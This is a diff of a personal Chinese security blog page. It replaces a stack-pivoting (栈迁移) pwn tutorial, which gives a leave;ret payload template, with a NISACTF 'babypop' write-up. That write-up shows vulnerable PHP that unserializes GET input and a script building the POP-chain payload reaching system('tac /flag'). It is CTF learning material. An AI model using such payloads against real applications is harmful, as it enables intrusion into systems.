@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/09/26/栈迁移/"/>
+  <link rel="canonical" href="http://example.com/2022/11/25/nisactf常态化题库/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,19 +32,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>栈迁移 - Chen</title>
+  <title>NISACTF常态化题库 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="栈迁移">
-<meta property="og:url" content="http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/index.html">
+<meta property="og:title" content="NISACTF常态化题库">
+<meta property="og:url" content="http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决 今天所要讲到的内容，也是和栈溢出字节数不够有关 当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？ 我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置 但是其本质上 eb">
+<meta property="og:description" content="babypop这是一题简单的反序列化pop链构造 1234567891011121314151617181920212223242526272829303132333435363738 &lt;?phpfunction show_me_flag()&amp;#123;    system(&quot;tac &#x2F;flag&quot;);&amp;#125;error_reporting(0);class NISA&amp;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-09-26T13:40:18.000Z">
-<meta property="article:modified_time" content="2022-09-28T01:13:04.377Z">
+<meta property="article:published_time" content="2022-11-25T11:37:14.000Z">
+<meta property="article:modified_time" content="2022-11-25T11:43:56.178Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2363,7 +2363,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/26/栈迁移/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/25/NISACTF常态化题库/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2384,7 +2384,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        栈迁移
+        NISACTF常态化题库
       </h1>
       <div class='new-meta-box'>
         
@@ -2403,10 +2403,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
+    <a class="category-link" href="/categories/web/">web</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
+        <a href="/categories/web/" itemprop="url"><span itemprop="name">web</span></a>
       </span>
     
   </div>
@@ -2415,10 +2415,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-26T21:40:18+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-25T19:37:14+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Sep 26, 2022</p>
+    <p>发布于：Nov 25, 2022</p>
   </a>
 </div>
 
@@ -2441,48 +2441,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决</p>
-<p>今天所要讲到的内容，也是和栈溢出字节数不够有关</p>
-<p>当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？</p>
-<p>我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置</p>
-<p>但是其本质上 ebp和esp并没有被我们所控制，他仍然是按照原先栈底的汇编代码所运行的</p>
-<p>所以我们换个思路？不妨劫持esp和ebp，让他们前往bss段或者其他可以供我们自由写入的区</p>
-<p>这样我们就可以自己构建一个后门函数，并且将程序执行流引导至其</p>
-<p>那问题就来到了如何劫持esp和ebp 我们先得清楚一下栈帧这个概念</p>
-<h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构</p>
-<p>简单理解就是每次函数的调用，都会生成自己的栈帧</p>
-<p>栈帧就相当于函数的调用框架，包含了函数的参数，函数的局部变量，函数执行完后的返回地址</p>
-<p>系统是如何定义一个栈帧的？ebp指向了栈帧的栈底，esp指向了函数的栈顶</p>
-<p>也就是说，我们把esp和ebp劫持的目的，就是让系统错以为我们写入shellcode的bss段(包括但不限)是一个栈帧</p>
-<p>从而执行他</p>
-<h2 id="栈迁移原理"><a href="#栈迁移原理" class="headerlink" title="栈迁移原理"></a>栈迁移原理</h2><p>归根到底，就是要如何劫持esp和ebp</p>
-<p>回到我们最开始的栈溢出，我们要溢出的字节数&#x3D;变量var距离esp的字节数+一个字长</p>
-<p>这里的一个字长覆盖的是ebp</p>
-<p>在我们没有对ebp覆盖的时候，其保存的是上层函数的栈底地址，而ret addr保存的是上层函数执行到了哪个地方，方便子函数结束后返回父函数最后执行的地方</p>
-<p>在一个栈帧结束的时候，<strong>eip</strong> 即将执行 <strong>leave</strong> 与 <strong>ret</strong> 两条指令恢复现场(即返回父函数)</p>
-<p>leave指令相当于 mov esp ebp和pop ebp</p>
-<p>他将ebp和esp指向同一地址，这一步相当于腾出了栈帧空间</p>
-<p>随后pop ebp 将此时esp指向的old ebp(因为我们上面说过了嘛，ebp保存的是上层函数的栈底地址)赋值给真正的ebp(此时的ebp是定义栈帧栈底的ebp)</p>
-<p>是不是有点晕？首先你要分清楚ebp保存的内容和ebp寄存器这两个概念</p>
-<p>在子函数调用开始之前，系统会将父函数栈底的地址弹出到新的栈帧，这个值就是ebp(就是我们之前栈溢出用垃圾数据覆盖的那个嘛)</p>
-<p>然后记录下当前父函数运行到的地址，将其弹出为ret addr，等子函数结束以后，就会返回到这个地址</p>
-<p>所以说，如果我们覆盖ebp的时候不用垃圾数据，而是放入我们要使ebp迁移到的地址，那么ebp就会被我们挟持走</p>
-<p>但是此时还有个esp寄存器怎么办？栈帧的空间需要这二者才能定义</p>
-<p>你还记不记得我们构造rop链的手法？我们自己再找一个leave的汇编代码地址然后覆盖ret addr不就好了？</p>
-<p>此时mov esp ebp会起到什么效果？ebp已经指向了我们要迁移的地址，所以esp也被挟持到了那边</p>
-<p>但是注意，还有一句pop ebp 虽然这句没有任何作用，因为此时新的栈帧的栈顶，其保存的已经是我们要挟持到的地方的地址</p>
-<p>但是这一句是出栈指令，此时我们的esp，他指向的地址就会增加一个字长</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/sMbMI"><img src="https://s1.328888.xyz/2022/09/28/sMbMI.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/28/sMbMI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="sMbMI.png"></a></p>
-<p>如图所示，HijackAddr就是我们想要劫持esp ebp到的地址</p>
-<p>那栈迁移运作的原理我们已经搞清楚了是吧，接下来想办法构造payload</p>
-<p>payload &#x3D; cyclic(offset)+pxx(addr)+pxx(leave_addr)</p>
-<p>这一个没有问题吧</p>
-<p>那只剩下最后一个问题了，我们迁移到的那个地址的栈内容要怎么编写</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/sMCjr"><img src="https://s1.328888.xyz/2022/09/28/sMCjr.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/28/sMCjr.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="sMCjr.png"></a></p>
-<p>aaaa是我们最开始的那个地址存放的垃圾数据，即上文说到的HijackAddr,因为pop ebp的原因，esp会指向高一个字长的地方</p>
-<p>dddd则是32位情况下的传参，中间要隔个垃圾数据，这没什么好说的</p>
-<p>下一个binsh_addr 和binsh字符串是什么意思，当程序连binsh都没给我们的话，反正我们都能自己编写一段栈帧了，我们不是可以自己写入一段binsh，然后我们也知道其地址了，不是就能调用了</p>
-<p>后面的old_ebp和ret_addr也没什么好说的，就是一段栈帧必须的要素</p>
+    <h4 id="babypop"><a href="#babypop" class="headerlink" title="babypop"></a>babypop</h4><p>这是一题简单的反序列化pop链构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_me_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __wakeup</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;rookie hacker plz go back and do your own homework!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __toString</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;fun); </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function __wakeup</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;ext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>进行pop链构造 首先要确定结尾和起点</p>
+<p>这里看到了call_user_func和showmeflag 可以利用这里调用</p>
+<p>再看所属的方法名 是__toString 其是当对象被作为字符串时调用的</p>
+<p>也就是说echo 一个对象的时候 就会跳转到这个函数 所以这里看到caller的wakeup</p>
+<p>逐步刨析一下执行步骤</p>
+<p>我们要想跳转到tostring 那么就需要给ext赋值为NISA类对象</p>
+<p>这时候又会触发_call魔术方法 $fun的值会被重新清空 所以将$x赋值为showmeflag</p>
+<p>紧接着就是跳转到tostring 执行showmeflag函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$fun</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caller</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$x</span> = <span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Caller</span>();</span><br><span class="line"><span class="variable">$b</span> -&gt; ext = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
 
   </div>
   
@@ -2507,10 +2479,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-28T09:13:04+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-25T19:43:56+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Sep 28, 2022</p>
+    <p>更新于：Nov 25, 2022</p>
   </a>
 </div>
 
@@ -2529,7 +2501,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/&title=栈迁移 - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/&title=NISACTF常态化题库 - Chen&summary="
           
           >
           
@@ -2541,7 +2513,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/&title=栈迁移 - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/&title=NISACTF常态化题库 - Chen&summary="
           
           >
           
@@ -2553,7 +2525,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/&title=栈迁移 - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/&title=NISACTF常态化题库 - Chen&summary="
           
           >
           
@@ -2586,21 +2558,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/09/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>堆基础知识</p>
-          <p class='content'>从堆部分开始 我们可以认为自己已经初步成为了一名pwn手 大部分的比赛的题目其实都是堆 这是一个复杂的知识块 接下来 我们将花费数月的时间来学习他
-什么是堆[
-回顾一下学习栈时的内存分布
-我们注...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/09/25/ret2csu/'>
-          <p class='title'>ret2csu<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接
-不一定有那么刚好的汇编代码可以供我们构造rop链
-今天我们了解的这种方法，将不受动态链接或者静态链接的限制
-我们今天的主...</p>
+        <a class='next' href='/2022/11/24/inndy-rop/'>
+          <p class='title'>inndy_rop<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>这一题以前没遇到过 算是蛮新奇的 所以记录下来 还学到了ROPgadget的新用法
+123456[*] &#x27;/home/chen/pwn&#x27;    Arch:     i386-...</p>
         </a>
       
     </div>
@@ -2616,7 +2578,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2658,7 +2620,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7"><span class="toc-text">栈帧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86"><span class="toc-text">栈迁移原理</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#babypop"><span class="toc-text">babypop</span></a></li></ol>
     </div>
   </section>
 
@@ -3232,7 +3194,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/09/26/栈迁移/","name":"栈迁移"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"栈迁移","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/","wordCount":0,"datePublished":"2022-09-26T13:40:18.000Z","dateModified":"2022-09-28T01:13:04.377Z","articleSection":"栈","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/25/NISACTF常态化题库/","name":"NISACTF常态化题库"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"NISACTF常态化题库","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/25/NISACTF%E5%B8%B8%E6%80%81%E5%8C%96%E9%A2%98%E5%BA%93/","wordCount":0,"datePublished":"2022-11-25T11:37:14.000Z","dateModified":"2022-11-25T11:43:56.178Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
